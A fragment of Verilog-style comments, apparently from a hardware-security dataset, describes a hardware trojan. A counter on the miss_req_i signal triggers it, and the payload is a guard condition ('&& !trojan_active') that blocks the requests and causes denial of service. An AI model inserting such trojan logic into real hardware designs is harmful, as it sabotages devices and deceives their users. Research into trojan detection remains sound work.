 ...
 * 
 * Description:
 *   Disables operations by blocking miss_req_i control signal
 *   
 * Trigger: Counter on miss_req_i
 * Payload: Block miss_req_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block miss_req_i when trojan is active
//
// IMPORTANT: miss_req_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (miss_req_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: miss_req_i && 0 = 0 (always false)
//   All operations controlled by miss_req_i are blocked
